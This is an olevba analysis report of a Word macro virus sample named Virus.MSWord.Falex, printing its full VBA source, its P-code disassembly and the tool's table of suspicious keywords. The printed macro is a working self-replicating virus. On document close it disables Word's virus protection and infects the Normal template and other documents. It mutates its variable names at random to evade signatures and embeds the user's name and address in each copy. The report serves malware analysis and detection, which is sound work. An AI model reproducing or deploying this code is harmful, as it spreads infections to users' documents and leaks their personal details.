olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Falex
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Falex - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Truex = True, Falsex = False, Zero = 0, One = 1, wdFormatDocumentx = wdFormatDocument, wdFormatTemplatex = wdFormatTemplate, DoubleDot = ":"

Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim activedoc, normaltmp As Object
Dim ActiveDocName, OurCode As String

Set activedoc = ActiveDocument.VBProject.VBComponents.Item(One)
Set normaltmp = NormalTemplate.VBProject.VBComponents.Item(One)


DocumentInfected = Falsex
NormalTemplateInfected = Falsex

If activedoc.CodeModule.CountOfLines <> Zero Then DocumentInfected = Truex
If normaltmp.CodeModule.CountOfLines <> Zero Then NormalTemplateInfected = Truex

Options.VirusProtection = Falsex

If (DocumentInfected = Truex Xor NormalTemplateInfected = Truex) And (ActiveDocument.SaveFormat = wdFormatDocumentx Or ActiveDocument.SaveFormat = wdFormatTemplatex) Then
   
  If DocumentInfected = Truex Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = activedoc.CodeModule.Lines(One, activedoc.CodeModule.CountOfLines)
    
    Call AppendLog(OurCode)
    Call PolyIt(OurCode)

    normaltmp.CodeModule.InsertLines One, OurCode
    
    If SaveNormalTemplate = Truex Then NormalTemplate.Save
    
  End If


  ActiveDocName = Mid(ActiveDocument.FullName, 2, One)
  If NormalTemplateInfected = Truex And (ActiveDocName = DoubleDot Or ActiveDocument.Saved = Falsex) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = normaltmp.CodeModule.Lines(1, normaltmp.CodeModule.CountOfLines)
    
    activedoc.CodeModule.InsertLines One, OurCode
    
    If SaveDocument = Truex Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub


Private Sub PolyIt(ByRef OurCode As String)

On Error Resume Next

Const PolyItVarCount = 16, VarCount = PolyItVarCount + 23, UpperLimit = 15, LowerLimit = 5, AsciiA = 65, AsciiZ = 90, One = 1

Dim Variable(One To VarCount), Variable2(One To VarCount), NewCode As String
Dim CounterI, CounterJ, CounterK As Integer
Dim Changed As Boolean

Variable(1) = "OurCode"
Variable(2) = "VarCount"
Variable(3) = "Variable"
Variable(4) = "Variable2"
Variable(5) = "NewCode"
Variable(6) = "CounterI"
Variable(7) = "CounterJ"
Variable(8) = "CounterK"
Variable(9) = "Changed"
Variable(10) = "PolyIt"
Variable(11) = "PolyItVarCount"
Variable(12) = "UpperLimit"
Variable(13) = "LowerLimit"
Variable(14) = "AsciiA"
Variable(15) = "AsciiZ"
Variable(16) = "One"

Variable(PolyItVarCount + 1) = "SaveDocument"
Variable(PolyItVarCount + 2) = "SaveNormalTemplate"
Variable(PolyItVarCount + 3) = "DocumentInfected"
Variable(PolyItVarCount + 4) = "NormalTemplateInfected"
Variable(PolyItVarCount + 5) = "activedoc"
Variable(PolyItVarCount + 6) = "normaltmp"
Variable(PolyItVarCount + 7) = "AppendLog"
Variable(PolyItVarCount + 8) = "UserAddy"
Variable(PolyItVarCount + 9) = "Chr13"
Variable(PolyItVarCount + 10) = "Chr10"
Variable(PolyItVarCount + 11) = "Comment"
Variable(PolyItVarCount + 12) = "UserAddyTmp"
Variable(PolyItVarCount + 13) = "UserNameTmp"
Variable(PolyItVarCount + 14) = "TimeDate"
Variable(PolyItVarCount + 15) = "ActiveDocName"
Variable(PolyItVarCount + 16) = "Truex"
Variable(PolyItVarCount + 17) = "Falsex"
Variable(PolyItVarCount + 18) = "Zero"
Variable(PolyItVarCount + 19) = "wdFormatDocumentx"
Variable(PolyItVarCount + 20) = "wdFormatTemplatex"
Variable(PolyItVarCount + 21) = "TimeFormat"
Variable(PolyItVarCount + 22) = "DateFormat"
Variable(PolyItVarCount + 23) = "DoubleDot"

Randomize

For CounterI = One To VarCount
  For CounterJ = One To Int((UpperLimit - LowerLimit + One) * Rnd + LowerLimit)
    Variable2(CounterI) = Variable2(CounterI) & Chr(Int((AsciiZ - AsciiA + 1) * Rnd + AsciiA))
  Next CounterJ
Next CounterI

Changed = False
For CounterI = One To Len(OurCode)

  For CounterJ = One To VarCount
  
    If Mid(OurCode, CounterI, Len(Variable(CounterJ))) = Variable(CounterJ) Then
      NewCode = NewCode & Variable2(CounterJ)
      CounterI = CounterI + Len(Variable(CounterJ)) - One
      Changed = True
      Exit For
    End If
    
  Next CounterJ
  
  If Changed = False Then
    NewCode = NewCode & Mid(OurCode, CounterI, One)
  Else
    Changed = False
  End If
  
Next CounterI

OurCode = NewCode

End Sub


Private Sub AppendLog(ByRef OurCode As String)

On Error Resume Next

Const Comment = "' "
Const TimeFormat = "hh:mm:ss: AMPM - ", DateFormat = "dddd, d mmm yyyy"

Dim UserAddyTmp, UserAddy, UserNameTmp, TimeDate, Chr13, Chr10 As String
Dim CounterI As Integer

    Chr13 = Chr(13)
    UserAddy = Application.UserAddress
    TimeDate = Format(Time, TimeFormat) & Format(Date, DateFormat)
    Chr10 = Chr(10)
    UserNameTmp = Application.UserName
    
    For i = 1 To Len(UserAddy)
      If Mid(UserAddy, CounterI, 1) <> Chr13 Then
        If Mid(UserAddy, CounterI, 1) <> Chr10 Then
          UserAddyTmp = UserAddyTmp & Mid(UserAddy, CounterI, 1)
        End If
      Else
        UserAddyTmp = UserAddyTmp & Chr13 & Comment
      End If
    Next i

    OurCode = OurCode & Chr13 & Comment & TimeDate & Chr13 & Comment & UserNameTmp & Chr13 & Comment & UserAddy & Chr13
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Falex
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9372 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' Line #4:
' 	Dim (Const) 
' 	LitVarSpecial (True)
' 	VarDefn Truex
' 	LitVarSpecial (False)
' 	VarDefn Falsex
' 	LitDI2 0x0000 
' 	VarDefn Zero
' 	LitDI2 0x0001 
' 	VarDefn One
' 	Ld wdFormatDocument 
' 	VarDefn wdFormatDocumentx
' 	Ld wdFormatTemplate 
' 	VarDefn wdFormatTemplatex
' 	LitStr 0x0001 ":"
' 	VarDefn DoubleDot
' Line #5:
' Line #6:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #7:
' 	Dim 
' 	VarDefn activedoc
' 	VarDefn normaltmp (As Object)
' Line #8:
' 	Dim 
' 	VarDefn ActiveDocName
' 	VarDefn OurCode (As String)
' Line #9:
' Line #10:
' 	SetStmt 
' 	Ld One 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set activedoc 
' Line #11:
' 	SetStmt 
' 	Ld One 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set normaltmp 
' Line #12:
' Line #13:
' Line #14:
' 	Ld Falsex 
' 	St DocumentInfected 
' Line #15:
' 	Ld Falsex 
' 	St NormalTemplateInfected 
' Line #16:
' Line #17:
' 	Ld activedoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Zero 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Truex 
' 	St DocumentInfected 
' 	EndIf 
' Line #18:
' 	Ld normaltmp 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Zero 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Truex 
' 	St NormalTemplateInfected 
' 	EndIf 
' Line #19:
' Line #20:
' 	Ld Falsex 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #21:
' Line #22:
' 	Ld DocumentInfected 
' 	Ld Truex 
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	Ld Truex 
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocumentx 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplatex 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #23:
' Line #24:
' 	Ld DocumentInfected 
' 	Ld Truex 
' 	Eq 
' 	IfBlock 
' Line #25:
' Line #26:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #27:
' Line #28:
' 	Ld One 
' 	Ld activedoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld activedoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #29:
' Line #30:
' 	Ld OurCode 
' 	ArgsCall (Call) AppendLog 0x0001 
' Line #31:
' 	Ld OurCode 
' 	ArgsCall (Call) PolyIt 0x0001 
' Line #32:
' Line #33:
' 	Ld One 
' 	Ld OurCode 
' 	Ld normaltmp 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #34:
' Line #35:
' 	Ld SaveNormalTemplate 
' 	Ld Truex 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #36:
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' Line #40:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	Ld One 
' 	ArgsLd Mid$ 0x0003 
' 	St ActiveDocName 
' Line #41:
' 	Ld NormalTemplateInfected 
' 	Ld Truex 
' 	Eq 
' 	Ld ActiveDocName 
' 	Ld DoubleDot 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld Falsex 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #42:
' Line #43:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #44:
' Line #45:
' 	LitDI2 0x0001 
' 	Ld normaltmp 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld normaltmp 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #46:
' Line #47:
' 	Ld One 
' 	Ld OurCode 
' 	Ld activedoc 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #48:
' Line #49:
' 	Ld SaveDocument 
' 	Ld Truex 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #50:
' Line #51:
' 	EndIfBlock 
' Line #52:
' Line #53:
' Line #54:
' 	EndIfBlock 
' Line #55:
' Line #56:
' 	EndSub 
' Line #57:
' Line #58:
' Line #59:
' 	FuncDefn (Private Sub PolyIt(ByRef OurCode As String))
' Line #60:
' Line #61:
' 	OnError (Resume Next) 
' Line #62:
' Line #63:
' 	Dim (Const) 
' 	LitDI2 0x0010 
' 	VarDefn PolyItVarCount
' 	Ld PolyItVarCount 
' 	LitDI2 0x0017 
' 	Add 
' 	VarDefn VarCount
' 	LitDI2 0x000F 
' 	VarDefn UpperLimit
' 	LitDI2 0x0005 
' 	VarDefn LowerLimit
' 	LitDI2 0x0041 
' 	VarDefn AsciiA
' 	LitDI2 0x005A 
' 	VarDefn AsciiZ
' 	LitDI2 0x0001 
' 	VarDefn One
' Line #64:
' Line #65:
' 	Dim 
' 	Ld One 
' 	Ld VarCount 
' 	VarDefn Variable
' 	Ld One 
' 	Ld VarCount 
' 	VarDefn Variable2
' 	VarDefn NewCode (As String)
' Line #66:
' 	Dim 
' 	VarDefn CounterI
' 	VarDefn CounterJ
' 	VarDefn CounterK (As Integer)
' Line #67:
' 	Dim 
' 	VarDefn Changed (As Boolean)
' Line #68:
' Line #69:
' 	LitStr 0x0007 "OurCode"
' 	LitDI2 0x0001 
' 	ArgsSt Variable 0x0001 
' Line #70:
' 	LitStr 0x0008 "VarCount"
' 	LitDI2 0x0002 
' 	ArgsSt Variable 0x0001 
' Line #71:
' 	LitStr 0x0008 "Variable"
' 	LitDI2 0x0003 
' 	ArgsSt Variable 0x0001 
' Line #72:
' 	LitStr 0x0009 "Variable2"
' 	LitDI2 0x0004 
' 	ArgsSt Variable 0x0001 
' Line #73:
' 	LitStr 0x0007 "NewCode"
' 	LitDI2 0x0005 
' 	ArgsSt Variable 0x0001 
' Line #74:
' 	LitStr 0x0008 "CounterI"
' 	LitDI2 0x0006 
' 	ArgsSt Variable 0x0001 
' Line #75:
' 	LitStr 0x0008 "CounterJ"
' 	LitDI2 0x0007 
' 	ArgsSt Variable 0x0001 
' Line #76:
' 	LitStr 0x0008 "CounterK"
' 	LitDI2 0x0008 
' 	ArgsSt Variable 0x0001 
' Line #77:
' 	LitStr 0x0007 "Changed"
' 	LitDI2 0x0009 
' 	ArgsSt Variable 0x0001 
' Line #78:
' 	LitStr 0x0006 "PolyIt"
' 	LitDI2 0x000A 
' 	ArgsSt Variable 0x0001 
' Line #79:
' 	LitStr 0x000E "PolyItVarCount"
' 	LitDI2 0x000B 
' 	ArgsSt Variable 0x0001 
' Line #80:
' 	LitStr 0x000A "UpperLimit"
' 	LitDI2 0x000C 
' 	ArgsSt Variable 0x0001 
' Line #81:
' 	LitStr 0x000A "LowerLimit"
' 	LitDI2 0x000D 
' 	ArgsSt Variable 0x0001 
' Line #82:
' 	LitStr 0x0006 "AsciiA"
' 	LitDI2 0x000E 
' 	ArgsSt Variable 0x0001 
' Line #83:
' 	LitStr 0x0006 "AsciiZ"
' 	LitDI2 0x000F 
' 	ArgsSt Variable 0x0001 
' Line #84:
' 	LitStr 0x0003 "One"
' 	LitDI2 0x0010 
' 	ArgsSt Variable 0x0001 
' Line #85:
' Line #86:
' 	LitStr 0x000C "SaveDocument"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #87:
' 	LitStr 0x0012 "SaveNormalTemplate"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0002 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #88:
' 	LitStr 0x0010 "DocumentInfected"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #89:
' 	LitStr 0x0016 "NormalTemplateInfected"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0004 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #90:
' 	LitStr 0x0009 "activedoc"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0005 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #91:
' 	LitStr 0x0009 "normaltmp"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0006 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #92:
' 	LitStr 0x0009 "AppendLog"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0007 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #93:
' 	LitStr 0x0008 "UserAddy"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0008 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #94:
' 	LitStr 0x0005 "Chr13"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0009 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #95:
' 	LitStr 0x0005 "Chr10"
' 	Ld PolyItVarCount 
' 	LitDI2 0x000A 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #96:
' 	LitStr 0x0007 "Comment"
' 	Ld PolyItVarCount 
' 	LitDI2 0x000B 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #97:
' 	LitStr 0x000B "UserAddyTmp"
' 	Ld PolyItVarCount 
' 	LitDI2 0x000C 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #98:
' 	LitStr 0x000B "UserNameTmp"
' 	Ld PolyItVarCount 
' 	LitDI2 0x000D 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #99:
' 	LitStr 0x0008 "TimeDate"
' 	Ld PolyItVarCount 
' 	LitDI2 0x000E 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #100:
' 	LitStr 0x000D "ActiveDocName"
' 	Ld PolyItVarCount 
' 	LitDI2 0x000F 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #101:
' 	LitStr 0x0005 "Truex"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0010 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #102:
' 	LitStr 0x0006 "Falsex"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0011 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #103:
' 	LitStr 0x0004 "Zero"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0012 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #104:
' 	LitStr 0x0011 "wdFormatDocumentx"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0013 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #105:
' 	LitStr 0x0011 "wdFormatTemplatex"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0014 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #106:
' 	LitStr 0x000A "TimeFormat"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0015 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #107:
' 	LitStr 0x000A "DateFormat"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0016 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #108:
' 	LitStr 0x0009 "DoubleDot"
' 	Ld PolyItVarCount 
' 	LitDI2 0x0017 
' 	Add 
' 	ArgsSt Variable 0x0001 
' Line #109:
' Line #110:
' 	ArgsCall Read 0x0000 
' Line #111:
' Line #112:
' 	StartForVariable 
' 	Ld CounterI 
' 	EndForVariable 
' 	Ld One 
' 	Ld VarCount 
' 	For 
' Line #113:
' 	StartForVariable 
' 	Ld CounterJ 
' 	EndForVariable 
' 	Ld One 
' 	Ld UpperLimit 
' 	Ld LowerLimit 
' 	Sub 
' 	Ld One 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld LowerLimit 
' 	Add 
' 	FnInt 
' 	For 
' Line #114:
' 	Ld CounterI 
' 	ArgsLd Variable2 0x0001 
' 	Ld AsciiZ 
' 	Ld AsciiA 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld AsciiA 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld CounterI 
' 	ArgsSt Variable2 0x0001 
' Line #115:
' 	StartForVariable 
' 	Ld CounterJ 
' 	EndForVariable 
' 	NextVar 
' Line #116:
' 	StartForVariable 
' 	Ld CounterI 
' 	EndForVariable 
' 	NextVar 
' Line #117:
' Line #118:
' 	LitVarSpecial (False)
' 	St Changed 
' Line #119:
' 	StartForVariable 
' 	Ld CounterI 
' 	EndForVariable 
' 	Ld One 
' 	Ld OurCode 
' 	FnLen 
' 	For 
' Line #120:
' Line #121:
' 	StartForVariable 
' 	Ld CounterJ 
' 	EndForVariable 
' 	Ld One 
' 	Ld VarCount 
' 	For 
' Line #122:
' Line #123:
' 	Ld OurCode 
' 	Ld CounterI 
' 	Ld CounterJ 
' 	ArgsLd Variable 0x0001 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Ld CounterJ 
' 	ArgsLd Variable 0x0001 
' 	Eq 
' 	IfBlock 
' Line #124:
' 	Ld NewCode 
' 	Ld CounterJ 
' 	ArgsLd Variable2 0x0001 
' 	Concat 
' 	St NewCode 
' Line #125:
' 	Ld CounterI 
' 	Ld CounterJ 
' 	ArgsLd Variable 0x0001 
' 	FnLen 
' 	Add 
' 	Ld One 
' 	Sub 
' 	St CounterI 
' Line #126:
' 	LitVarSpecial (True)
' 	St Changed 
' Line #127:
' 	ExitFor 
' Line #128:
' 	EndIfBlock 
' Line #129:
' Line #130:
' 	StartForVariable 
' 	Ld CounterJ 
' 	EndForVariable 
' 	NextVar 
' Line #131:
' Line #132:
' 	Ld Changed 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #133:
' 	Ld NewCode 
' 	Ld OurCode 
' 	Ld CounterI 
' 	Ld One 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St NewCode 
' Line #134:
' 	ElseBlock 
' Line #135:
' 	LitVarSpecial (False)
' 	St Changed 
' Line #136:
' 	EndIfBlock 
' Line #137:
' Line #138:
' 	StartForVariable 
' 	Ld CounterI 
' 	EndForVariable 
' 	NextVar 
' Line #139:
' Line #140:
' 	Ld NewCode 
' 	St OurCode 
' Line #141:
' Line #142:
' 	EndSub 
' Line #143:
' Line #144:
' Line #145:
' 	FuncDefn (Private Sub AppendLog(ByRef OurCode As String))
' Line #146:
' Line #147:
' 	OnError (Resume Next) 
' Line #148:
' Line #149:
' 	Dim (Const) 
' 	LitStr 0x0002 "' "
' 	VarDefn Comment
' Line #150:
' 	Dim (Const) 
' 	LitStr 0x0011 "hh:mm:ss: AMPM - "
' 	VarDefn TimeFormat
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	VarDefn DateFormat
' Line #151:
' Line #152:
' 	Dim 
' 	VarDefn UserAddyTmp
' 	VarDefn UserAddy
' 	VarDefn UserNameTmp
' 	VarDefn TimeDate
' 	VarDefn Chr13
' 	VarDefn Chr10 (As String)
' Line #153:
' 	Dim 
' 	VarDefn CounterI (As Integer)
' Line #154:
' Line #155:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	St Chr13 
' Line #156:
' 	Ld Application 
' 	MemLd UserAddress 
' 	St UserAddy 
' Line #157:
' 	Ld Time 
' 	Ld TimeFormat 
' 	ArgsLd Format$ 0x0002 
' 	Ld Date 
' 	Ld DateFormat 
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	St TimeDate 
' Line #158:
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	St Chr10 
' Line #159:
' 	Ld Application 
' 	MemLd UserName 
' 	St UserNameTmp 
' Line #160:
' Line #161:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld UserAddy 
' 	FnLen 
' 	For 
' Line #162:
' 	Ld UserAddy 
' 	Ld CounterI 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Chr13 
' 	Ne 
' 	IfBlock 
' Line #163:
' 	Ld UserAddy 
' 	Ld CounterI 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Chr10 
' 	Ne 
' 	IfBlock 
' Line #164:
' 	Ld UserAddyTmp 
' 	Ld UserAddy 
' 	Ld CounterI 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddyTmp 
' Line #165:
' 	EndIfBlock 
' Line #166:
' 	ElseBlock 
' Line #167:
' 	Ld UserAddyTmp 
' 	Ld Chr13 
' 	Concat 
' 	Ld Comment 
' 	Concat 
' 	St UserAddyTmp 
' Line #168:
' 	EndIfBlock 
' Line #169:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #170:
' Line #171:
' 	Ld OurCode 
' 	Ld Chr13 
' 	Concat 
' 	Ld Comment 
' 	Concat 
' 	Ld TimeDate 
' 	Concat 
' 	Ld Chr13 
' 	Concat 
' 	Ld Comment 
' 	Concat 
' 	Ld UserNameTmp 
' 	Concat 
' 	Ld Chr13 
' 	Concat 
' 	Ld Comment 
' 	Concat 
' 	Ld UserAddy 
' 	Concat 
' 	Ld Chr13 
' 	Concat 
' 	St OurCode 
' Line #172:
' 	EndSub 
' Line #173:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

